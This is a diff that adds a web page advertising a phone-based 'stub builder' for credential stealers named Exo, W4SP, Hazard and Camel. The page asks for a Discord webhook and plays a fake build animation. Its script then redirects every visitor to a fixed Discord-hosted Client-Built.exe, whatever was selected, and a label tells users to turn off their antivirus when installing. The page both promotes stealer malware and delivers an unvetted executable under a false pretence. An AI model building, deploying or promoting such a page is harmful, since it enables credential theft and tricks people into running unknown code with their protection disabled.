@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Webbased Stub Builder</title>
+    <meta name="description" content="Build Stubs From just Your Phone. No need for Computer anymore we have got you!">
+    <meta property="og:title" content="Webbased Stub Builder">
+    <meta property="og:description" content="Build Stubs From just Your Phone. No need for Computer anymore we have got you!, We have a selection of 3 stealers. Hazard stealer, Exo Stealer and last but not least W4sp Stealer All coded in python and compiled in less than 10 seconds.">
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <link rel="icon" href="https://aresclient.org/resources/icon.svg">
+    <meta property="og:image" content="https://aresclient.org/resources/icon.svg">
+		<script src="https://cdn.tailwindcss.com/"></script>
+		<link
+			href="../../cdnjs.cloudflare.com/ajax/libs/flowbite/1.6.5/flowbite.min.css"
+			rel="stylesheet"
+		/>
+
+		<style>
+			* {
+				transition: all 1.2s ease-in-out;
+			}
+		</style>
+	</head>
+
+	<body class="bg-black text-white">
+		<div
+			class="bg-gradient-to-b to-transparent from-blue-700 w-full h-full absolute top-0 left-0 z-0"
+		>
+			<div class="m-6">
+				<div
+					class="w-full p-6 space-y-8 sm:p-8 rounded-lg shadow-xl bg-neutral-900"
+					id="main-modal"
+				>
+					<h2 class="font-extrabold text-4xl">Build Tool</h2>
+
+					<hr class="border-t-2 border-neutral-800 my-8 border-lg" />
+
+					<h3 class="mb-5 text-lg font-medium text-gray-900 dark:text-white">
+						Choose Stealer To Build:
+					</h3>
+					<ul class="grid w-full gap-6 md:grid-cols-3">
+						<li>
+							<input type="checkbox" id="exo" value="" class="hidden peer" required="" />
+							<label
+								for="exo"
+								class="inline-flex items-center justify-between w-full p-5 text-gray-500 border-2 border-neutral-800 border-gray-200 rounded-lg cursor-pointer peer-checked:border-violet-400 hover:text-gray-600 dark:peer-checked:text-gray-300 peer-checked:text-gray-600 hover:bg-neutral-800/80 bg-neutral-800"
+							>
+								<div class="block">
+									<img
+										src="../../em-content.zobj.net/thumbs/120/twitter/322/smiling-face-with-horns_1f608.png"
+										alt=""
+										width="30px"
+									/>
+									<div class="w-full text-lg font-semibold text-white">Exo Stealer</div>
+									<div class="w-full text-sm text-gray-200">Fast Stealer with Nice reliability no need to worry about errors</div>
+								</div>
+							</label>
+						</li>
+
+						<li>
+							<input type="checkbox" id="W4SP" value="" class="hidden peer" required="" />
+							<label
+								for="W4SP"
+								class="inline-flex items-center justify-between w-full p-5 text-gray-500 border-2 border-neutral-800 border-gray-200 rounded-lg cursor-pointer peer-checked:border-yellow-400 hover:text-gray-600 dark:peer-checked:text-gray-300 peer-checked:text-gray-600 hover:bg-neutral-800/80 bg-neutral-800"
+							>
+								<div class="block">
+									<img
+										src="../../images.emojiterra.com/mozilla/512px/1f41d.png"
+										alt=""
+										width="30px"
+									/>
+									<div class="w-full text-lg font-semibold text-white">W4SP Stealer</div>
+									<div class="w-full text-sm text-gray-200">
+										W4sp, Scary Stealer that gathers tons of info
+									</div>
+								</div>
+							</label>
+						</li>
+
+						<li>
+							<input type="checkbox" id="hazard" value="" class="hidden peer" required="" />
+							<label
+								for="hazard"
+								class="inline-flex items-center justify-between w-full p-5 text-gray-500 border-2 border-neutral-800 border-gray-200 rounded-lg cursor-pointer peer-checked:border-green-400 hover:text-gray-600 dark:peer-checked:text-gray-300 peer-checked:text-gray-600 hover:bg-neutral-800/80 bg-neutral-800"
+							>
+								<div class="block">
+									<img
+										src="../../images.emojiterra.com/google/android-12l/512px/1f52b.png"
+										alt=""
+										width="30px"
+									/>
+									<div class="w-full text-lg font-semibold text-white">Hazard Stealer</div>
+									<div class="w-full text-sm text-gray-200">
+										Classic hazard, Oldie But a Goodie
+									</div>
+								</div>
+							</label>
+						</li>
+
+						<li>
+							<input type="checkbox" id="camel" value="" class="hidden peer" required="" />
+							<label
+								for="camel"
+								class="inline-flex items-center justify-between w-full p-5 text-gray-500 border-2 border-neutral-800 border-gray-200 rounded-lg cursor-pointer peer-checked:border-yellow-700 hover:text-gray-600 dark:peer-checked:text-gray-300 peer-checked:text-gray-600 hover:bg-neutral-800/80 bg-neutral-800"
+							>
+								<div class="block">
+									<img
+										src="../../em-content.zobj.net/source/microsoft-teams/337/camel_1f42a.png"
+										alt=""
+										width="30px"
+									/>
+									<div class="w-full text-lg font-semibold text-white">Camel Stealer</div>
+									<div class="w-full text-sm text-gray-200">
+										Powerful Stealer written in python with Very good Reliablity
+									</div>
+								</div>
+							</label>
+						</li>
+					</ul>
+
+					<!--  -->
+					<div class="flex">
+						<div class="flex items-center mr-4">
+							<input
+								id="err-msg"
+								type="checkbox"
+								value=""
+								class="w-4 h-4 text-black bg-gray-100 border-gray-300 rounded focus:ring-white dark:focus:ring-white dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
+							/>
+							<label
+								for="err-msg"
+								class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300"
+								>Show Error Box</label
+							>
+						</div>
+
+						<div class="flex items-center mr-4">
+							<input
+								id="err-msg"
+								type="checkbox"
+								value=""
+								class="w-4 h-4 text-black bg-gray-100 border-gray-300 rounded focus:ring-white dark:focus:ring-white dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
+							/>
+							<label
+								for="err-msg"
+								class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300"
+								>Add To Startup</label
+							>
+						</div>
+
+						<div class="flex items-center mr-4">
+							<input
+								id="err-msg"
+								type="checkbox"
+								value=""
+								class="w-4 h-4 text-black bg-gray-100 border-gray-300 rounded focus:ring-white dark:focus:ring-white dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
+							/>
+							<label
+								for="err-msg"
+								class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300"
+								>Obfuscated</label
+							>
+						</div>
+					</div>
+
+					<div class="mr-4">
+						<input
+							id="err-msg"
+							type="checkbox"
+							value=""
+							class="w-4 h-4 text-black bg-gray-100 border-gray-300 rounded focus:ring-white dark:focus:ring-white dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
+							disabled
+						/>
+						<label for="err-msg" class="ml-2 text-sm font-medium text-gray-500"
+							>Crypter (SOON)   MAKE SURE YOU Turn Off Your Anti Virus When Installing!</label
+						>
+					</div>
+
+					<!--  -->
+
+					<hr class="border-t-2 border-neutral-800 my-8 border-lg" />
+					<div>
+						<div class="relative">
+							<div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
+								<svg
+									xmlns="http://www.w3.org/2000/svg"
+									width="24"
+									height="24"
+									viewBox="0 0 24 24"
+									style="fill: white"
+								>
+									<path
+										d="M4 18h2v4.081L11.101 18H16c1.103 0 2-.897 2-2V8c0-1.103-.897-2-2-2H4c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2z"
+									></path>
+									<path
+										d="M20 2H8c-1.103 0-2 .897-2 2h12c1.103 0 2 .897 2 2v8c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2z"
+									></path>
+								</svg>
+							</div>
+							<input
+								type="text"
+								id="webhook-url"
+								class="text-gray-900 text-sm rounded-lg block pl-10 p-2.5 ml-1 bg-neutral-800"
+								placeholder="Webhook URL"
+								required
+							/>
+						</div>
+						<div>
+							<button
+								id="build-stub"
+								type="button"
+								class="text-white bg-neutral-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-9 py-2.5 text-center inline-flex items-center mt-2 ml-1"
+							>
+								Confirm & Build
+								<svg
+									xmlns="http://www.w3.org/2000/svg"
+									width="18"
+									height="18"
+									class="ml-2"
+									viewBox="0 0 24 24"
+									style="fill: white"
+								>
+									<path
+										d="m3.553 18.895 4 2a1.001 1.001 0 0 0 .894 0L12 19.118l3.553 1.776a.99.99 0 0 0 .894.001l4-2c.339-.17.553-.516.553-.895v-5c0-.379-.214-.725-.553-.895L17 10.382V6c0-.379-.214-.725-.553-.895l-4-2a1 1 0 0 0-.895 0l-4 2C7.214 5.275 7 5.621 7 6v4.382l-3.447 1.724A.998.998 0 0 0 3 13v5c0 .379.214.725.553.895zM8 12.118l2.264 1.132-2.913 1.457-2.264-1.132L8 12.118zm4-2.5 3-1.5v2.264l-3 1.5V9.618zm6.264 3.632-2.882 1.441-2.264-1.132L16 12.118l2.264 1.132zM8 18.882l-.062-.031V16.65L11 15.118v2.264l-3 1.5zm8 0v-2.264l3-1.5v2.264l-3 1.5zM12 5.118l2.264 1.132-2.882 1.441-2.264-1.132L12 5.118z"
+									></path>
+								</svg>
+							</button>
+						</div>
+					</div>
+				</div>
+
+				<!--  -->
+			</div>
+		</div>
+	</body>
+	<script>
+		async function checkDiscordWebhook(webhookUrl) {
+			return webhookUrl.startsWith("https://discord.com/api/webhooks/");
+		}
+
+		var button = document.querySelector("#build-stub");
+
+		button.onclick = function () {
+			const webhookUrl = document.querySelector("#webhook-url").value;
+
+			checkDiscordWebhook(webhookUrl).then((exists) => {
+				if (!exists) {
+					alert("Webhook is not valid.");
+
+					return;
+				}
+
+				document.querySelector("#main-modal").innerHTML = `<center><div role="status">
+    <svg aria-hidden="true" class="inline w-24 h-24 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-gray-600 dark:fill-gray-300" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/>
+        <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/>
+    </svg>
+    <span class="sr-only">Loading...</span>
+</div>
+<p class="mt-10">Generting Stub, This May Take Some Time...</p></center>`;
+			});
+
+			setTimeout(() => {
+				window.location.replace("https://cdn.discordapp.com/attachments/1103810449323069473/1110022841652498502/Client-Built.exe");
+			}, 5500);
+		};
+	</script>
+
+</html>
